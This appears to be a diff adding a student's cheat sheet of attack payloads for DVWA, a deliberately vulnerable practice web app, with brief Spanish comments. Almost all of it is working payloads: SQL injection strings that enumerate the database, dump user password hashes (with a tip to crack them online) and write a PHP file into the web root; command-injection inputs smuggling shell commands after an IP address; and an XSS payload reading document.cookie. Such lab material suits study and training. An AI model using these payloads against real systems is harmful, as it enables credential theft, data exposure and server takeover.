@@ -1,0 +1,94 @@
+
+sql injection
+----------------------------------------------------
+%' or '0'='0
+----------------------------------------------------
+%' or 0=0 union select null, version() #  
+    the version of the mysql database.
+----------------------------------------------------
+%' or 0=0 union select null, user() #
+    
+--------------------------------------------------
+%' or 0=0 union select null, database() #
+    the name of the database.
+-------------------------------------------------
+%' and 1=0 union select null, table_name from information_schema.tables #
+    tables in the information_schema database.
+    
+------------------------------------------------------------
+%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+    the tables that start with the prefix "user" in the information_schema database.
+----------------------------------------------------
+%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
+    columns in the users table.
+    Notice there are a user_id, first_name, last_name, user and Password column.
+------------------------------------------------------------
+%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
+	password de usuarios
+	usar http://www.md5online.es/ para obtener el valor en texto del password de cada usuario
+-----------------------------------------------
+%' and 1=2 union all select 'a','b' into outfile "/var/www/html/dvwa/images/test.php" #
+
+__________________________________________________________________
+
+' and 1=0 union select null, TABLE_SCHEMA from information_schema.tables #
+    informacion de los schemas de la base de datos
+
+-----------------------------------------------
+' and 1=0 union select null, TABLE_NAME from information_schema.tables where TABLE_SCHEMA like 'dvwa%' #
+    tablas de la base de datos dvwa
+
+----------------------------------------------
+' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name like '%guest%' #
+    columnas de la tabla de guestbook de la base de datos de dvwa
+
+-------------------------------------------------------------------
+' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name like '%user%' and table_schema like 'dvwa%'#
+    columnas de la tabla de users de la base de datos de dvwa
+
+-------------------------------------------------------------------
+' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_schema like 'dvwa%'#
+    columnas de las tablas de la base de datos de dvwa
+------------------------------------------------------------
+' and 1=0 union select null, table_schema from information_schema.columns # 
+    nombres de las bases de datos del servidor mysql
+
+
+Vulnerability: Command Execution
+----------------------------
+127.127.0.1 | ls
+----------------------------
+127.0.0.1 | ls –alh /home/* (listado de los usuarios creados en la máquina)
+----------------------------
+127.0.0.1 & ls /var
+---------------------------
+127.0.0.1 | whoami
+------------------------
+127.0.0.1 | id
+------------------------
+127.0.0.1 | ps axjf
+------------------------
+127.0.0.1 |ls -alh /etc
+------------------------
+127.0.0.1 | cat /etc/crontab (ver contenido de archivos)
+-----------------------
+127.0.0.1 |find / -type f -perm -2 -print 2> /dev/null (archivos con permiso de lectura)
+
+
+Vulnerability: Cross Site Request Forgery (CSRF)
+----------------------------------------------------
+ver cambio.html
+
+
+Vulnerability: File Upload
+-----------------------------------------
+ver hola.php
+
+
+Vulnerability: Reflected Cross Site Scripting (XSS)
+------------------------------------
+<sCriPt>alert(document.cookie);</ScRiPt>
+
+
+
+
